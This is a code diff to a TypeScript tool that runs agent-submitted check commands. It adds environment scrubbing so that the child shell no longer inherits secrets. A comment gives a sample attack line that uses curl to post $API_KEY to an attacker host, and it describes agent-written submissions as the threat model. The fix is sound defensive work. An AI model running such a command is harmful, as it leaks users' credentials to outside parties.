@@ -4,6 +4,7 @@ import fs from 'fs';
 import os from 'os';
 import path from 'path';
 import type { Finding } from './schema';
+import { scrubbedEnv } from './confirm';
 
 /**
  * Does this check actually distinguish the trap from its absence?
@@ -77,7 +78,21 @@ function run(command: string, timeoutMs: number): Promise<number | null> {
     execFile(
       '/bin/sh',
       [script],
-      { timeout: timeoutMs, maxBuffer: 1 << 20, killSignal: 'SIGKILL' },
+      {
+        timeout: timeoutMs,
+        maxBuffer: 1 << 20,
+        killSignal: 'SIGKILL',
+        /*
+         * The same scrub confirm.ts applies, and this path needed it more.
+         * The gate runs a command AND an absentWhen that arrived in a
+         * submission -- written by an agent, seconds ago, which is the threat
+         * model everywhere else in this repository -- and it runs by default
+         * with the execution policy off. It inherited every secret in the
+         * shell until this line: `absentWhen: curl attacker -d "$API_KEY"`
+         * would simply have worked.
+         */
+        env: scrubbedEnv() as unknown as NodeJS.ProcessEnv,
+      },
       (err) => {
         try {
           fs.rmSync(dir, { recursive: true, force: true });
